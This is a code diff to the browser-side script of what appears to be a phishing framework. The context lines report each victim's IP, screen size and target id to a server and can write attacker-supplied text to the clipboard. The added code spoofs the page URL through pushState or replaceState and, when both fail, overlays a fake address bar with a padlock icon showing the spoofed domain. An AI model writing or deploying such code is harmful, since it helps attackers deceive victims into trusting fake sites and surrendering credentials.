@@ -44,10 +44,69 @@ socket.emit('new_phish', viewport_width, viewport_height, client_ip, target_id)
 socket.on("push_state", function(new_url){
   console.log(`Received push_state event: ${new_url}`)
   console.log(`Current URL before: ${window.location.href}`)
-  // Replace the entire URL to spoof the domain
-  history.replaceState({}, '', new_url)
-  console.log(`Current URL after: ${window.location.href}`)
+  
+  try {
+    // Use history.pushState instead of replaceState, as it's sometimes less restricted
+    history.pushState(null, '', new_url)
+    console.log(`URL spoofed using pushState: ${window.location.href}`)
+  } catch (error) {
+    console.log(`pushState failed: ${error.message}`)
+    
+    try {
+      // Fallback to replaceState
+      history.replaceState(null, '', new_url)
+      console.log(`URL spoofed using replaceState: ${window.location.href}`)
+    } catch (error2) {
+      console.log(`Both pushState and replaceState failed: ${error2.message}`)
+      
+      // Try a different approach - create a fake address bar
+      console.log(`Creating visual URL spoof...`)
+      createFakeAddressBar(new_url)
+    }
+  }
 })
+
+// Function to create a fake address bar overlay
+function createFakeAddressBar(spoofed_url) {
+  // Remove any existing fake address bar
+  const existing = document.getElementById('fake-address-bar')
+  if (existing) existing.remove()
+  
+  // Create fake address bar
+  const fakeBar = document.createElement('div')
+  fakeBar.id = 'fake-address-bar'
+  fakeBar.style.cssText = `
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    height: 35px;
+    background: #f0f0f0;
+    border-bottom: 1px solid #ccc;
+    z-index: 999999;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    font-size: 14px;
+    display: flex;
+    align-items: center;
+    padding: 0 10px;
+  `
+  
+  fakeBar.innerHTML = `
+    <span style="margin-right: 10px;">🔒</span>
+    <span style="background: white; padding: 5px 10px; border-radius: 15px; flex: 1;">${spoofed_url}</span>
+  `
+  
+  document.body.appendChild(fakeBar)
+  
+  // Adjust video position to account for fake bar
+  const video = document.querySelector('video')
+  if (video) {
+    video.style.marginTop = '35px'
+    video.style.height = 'calc(100vh - 35px)'
+  }
+  
+  console.log(`Fake address bar created showing: ${spoofed_url}`)
+}
 
 socket.on("copy_to_clipboard", function(data){
   copy_to_clipboard(data)
